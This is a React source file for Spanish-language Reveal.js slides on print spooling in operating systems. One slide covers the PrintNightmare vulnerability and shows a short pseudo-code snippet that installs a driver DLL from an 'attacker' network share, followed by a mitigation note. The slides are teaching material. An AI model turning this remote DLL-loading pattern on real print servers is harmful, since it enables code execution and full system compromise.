import React from "react";
import { Slide, Stack, Code } from "@revealjs/react";
import { motion } from "framer-motion";
import { ArrowRight, RotateCcw, ShieldAlert } from "lucide-react";

export default function SpoolingCritico() {
  return (
    <>
          {/* ── [MOVED] CASO CRÍTICO: SPOOLING ── */}
          <Stack>
          <Slide data-transition="zoom">
            <div style={{ padding: "0 8%", textAlign: "left" }}>
              <div
                style={{
                  display: "flex",
                  alignItems: "center",
                  gap: "2rem",
                  marginBottom: "3rem",
                }}
              >
                <RotateCcw size={50} color="var(--accent-spool)" />
                <h2 style={{ fontSize: "4.5rem", margin: 0 }}>
                  Análisis Crítico: Spooling
                </h2>
              </div>
              <div className="grid-2">
                <div
                  style={{
                    display: "flex",
                    flexDirection: "column",
                    gap: "2rem",
                  }}
                >
                  <div
                    className="metric-card"
                    style={{ borderLeft: "4px solid var(--accent-spool)" }}
                  >
                    <h4
                      style={{
                        fontSize: "1.8rem",
                        color: "var(--fg)",
                        marginBottom: "0.5rem",
                      }}
                    >
                      1. Exclusividad y Serialización
                    </h4>
                    <p
                      style={{
                        fontSize: "1.5rem !important",
                        margin: 0,
                        opacity: 0.8,
                      }}
                    >
                      Almacena trabajos completos en disco y los entrega
                      secuencialmente (FIFO), garantizando procesamiento atómico
                      sin intercalar páginas.
                    </p>
                  </div>
                  <div
                    className="metric-card"
                    style={{ borderLeft: "4px solid var(--accent-buf)" }}
                  >
                    <h4
                      style={{
                        fontSize: "1.8rem",
                        color: "var(--fg)",
                        marginBottom: "0.5rem",
                      }}
                    >
                      2. Multiprogramación Real
                    </h4>
                    <p
                      style={{
                        fontSize: "1.5rem !important",
                        margin: 0,
                        opacity: 0.8,
                      }}
                    >
                      Libera el proceso usuario inmediatamente. El spooler opera
                      como un servicio de sistema independiente (segundo plano).
                    </p>
                  </div>
                  <div
                    className="metric-card"
                    style={{ borderLeft: "4px solid var(--accent-cache)" }}
                  >
                    <h4
                      style={{
                        fontSize: "1.8rem",
                        color: "var(--fg)",
                        marginBottom: "0.5rem",
                      }}
                    >
                      3. Tolerancia a Fallos
                    </h4>
                    <p
                      style={{
                        fontSize: "1.5rem !important",
                        margin: 0,
                        opacity: 0.8,
                      }}
                    >
                      Los datos residen en disco no volátil. Permite reanudar
                      impresiones tras un corte de energía (a diferencia del
                      buffering).
                    </p>
                  </div>
                </div>
                <div className="glass-card" style={{ padding: "3rem" }}>
                  <h4
                    style={{
                      fontSize: "2.2rem",
                      color: "var(--accent-gold)",
                      marginBottom: "1.5rem",
                    }}
                  >
                    Abstracción de Formatos
                  </h4>
                  <p style={{ fontSize: "1.8rem !important", lineHeight: 1.5 }}>
                    El motor GDI realiza spooling de instrucciones como archivos
                    EMF, procesados por drivers específicos (PCL, PostScript).
                  </p>
                  <div className="technical-note" style={{ marginTop: "2rem" }}>
                    <strong style={{ color: "var(--accent-buf)" }}>
                      Ruta XPS Moderna:
                    </strong>{" "}
                    Pasa archivos directamente al dispositivo, eliminando
                    conversiones intermedias y reduciendo latencia.
                  </div>
                </div>
              </div>
            </div>
          </Slide>
          <Slide data-transition="slide-in fade-out">
            <div
              style={{
                padding: "0 8%",
                height: "100%",
                display: "flex",
                flexDirection: "column",
                justifyContent: "center",
              }}
            >
              <div
                className="grid-2"
                style={{
                  gap: "6rem",
                  alignItems: "center",
                  maxWidth: "1800px",
                  margin: "0 auto",
                }}
              >
                <div
                  style={{
                    textAlign: "left",
                    display: "flex",
                    flexDirection: "column",
                    gap: "2.5rem",
                    width: "100%",
                  }}
                >
                  <div>
                    <span
                      className="presenter-tag"
                      style={{
                        background: "rgba(203, 124, 148, 0.1)",
                        color: "var(--accent-red)",
                        borderColor: "rgba(203, 124, 148, 0.3)",
                        marginBottom: "1.5rem",
                      }}
                    >
                      AUDITORÍA // CVE-2021-34527
                    </span>
                    <h2
                      style={{
                        fontSize: "6rem",
                        margin: 0,
                        lineHeight: "1",
                        letterSpacing: "-0.02em",
                      }}
                    >
                      PrintNightmare
                    </h2>
                  </div>

                  <div
                    className="glass-card"
                    style={{
                      borderColor: "rgba(203, 124, 148, 0.3)",
                      padding: "3.5rem",
                      position: "relative",
                      overflow: "hidden",
                    }}
                  >
                    <div
                      style={{
                        position: "absolute",
                        top: "-20px",
                        right: "-20px",
                        opacity: 0.05,
                        pointerEvents: "none",
                      }}
                    >
                      <ShieldAlert size={250} color="var(--accent-red)" />
                    </div>
                    <p
                      style={{
                        fontSize: "2.5rem !important",
                        color: "var(--fg)",
                        lineHeight: "1.4",
                        margin: 0,
                        position: "relative",
                        zIndex: 1,
                      }}
                    >
                      Los servicios de Spooler legados permitieron la
                      <strong>Ejecución Remota de Código</strong> mediante la
                      inyección de DLLs arbitrarias. Según Walters (2025), la
                      postura de seguridad ha mejorado eliminando ejecuciones
                      remotas de código.
                    </p>
                    <div
                      style={{
                        marginTop: "2rem",
                        display: "grid",
                        gridTemplateColumns: "1fr 1fr",
                        gap: "1rem",
                      }}
                    >
                      <div
                        className="metric-card"
                        style={{ textAlign: "center" }}
                      >
                        <div
                          className="metric-val"
                          style={{ color: "var(--accent-red)" }}
                        >
                          35
                        </div>
                        <div className="metric-label">
                          Vulnerabilidades en 2022
                        </div>
                      </div>
                      <div
                        className="metric-card"
                        style={{ textAlign: "center" }}
                      >
                        <div
                          className="metric-val"
                          style={{ color: "var(--accent-cache)" }}
                        >
                          0
                        </div>
                        <div className="metric-label">RCEs desde 2021</div>
                      </div>
                    </div>
                  </div>

                  <div
                    style={{
                      display: "flex",
                      alignItems: "center",
                      gap: "1.5rem",
                      color: "var(--accent-red)",
                      background: "rgba(203, 124, 148, 0.1)",
                      padding: "2rem",
                      borderRadius: "20px",
                      border: "1px solid rgba(203, 124, 148, 0.2)",
                    }}
                  >
                    <ShieldAlert size={40} />
                    <span
                      style={{
                        fontWeight: 800,
                        fontSize: "2rem",
                        letterSpacing: "0.05em",
                      }}
                    >
                      FALLO CRÍTICO DE ARQUITECTURA
                    </span>
                  </div>
                </div>

                <div
                  style={{
                    display: "flex",
                    flexDirection: "column",
                    gap: "3rem",
                    width: "100%",
                  }}
                >
                  <div
                    style={{
                      borderRadius: "24px",
                      overflow: "hidden",
                      boxShadow: "0 50px 100px rgba(0,0,0,0.7)",
                      border: "1px solid var(--line)",
                    }}
                  >
                    <Code
                      language="javascript"
                      lineNumbers="1|3-5|7"
                      style={{
                        fontSize: "1.7rem",
                        padding: "2.5rem",
                        margin: 0,
                      }}
                    >
                      {`// Ataque RpcAddPrinterDriverEx
const evilDLL = "\\\\\\\\attacker\\\\exploit.dll";

// Inyección en el Spooler persistente
installDriver(evilDLL); 

// Resultado: Compromiso Total`}
                    </Code>
                  </div>

                  <motion.div
                    initial={{ opacity: 0, scale: 0.95 }}
                    whileInView={{ opacity: 1, scale: 1 }}
                    className="technical-note"
                    style={{
                      margin: 0,
                      borderColor: "var(--accent-red)",
                      background: "rgba(255, 255, 255, 0.03)",
                      padding: "2.5rem",
                      borderRadius: "24px",
                      borderLeftWidth: "12px",
                    }}
                  >
                    <h4
                      style={{
                        fontSize: "2.2rem !important",
                        color: "var(--fg)",
                        marginBottom: "1rem",
                        display: "flex",
                        alignItems: "center",
                        gap: "1rem",
                      }}
                    >
                      <ArrowRight color="var(--accent-red)" /> Mitigación
                    </h4>
                    <p
                      style={{
                        fontSize: "2rem !important",
                        margin: 0,
                        lineHeight: "1.4",
                      }}
                    >
                      Aislamiento de procesos y <strong>Sandboxing</strong> de
                      colas de impresión.
                    </p>
                  </motion.div>
                </div>
              </div>
            </div>
          </Slide>
        </Stack>

    </>
  );
}
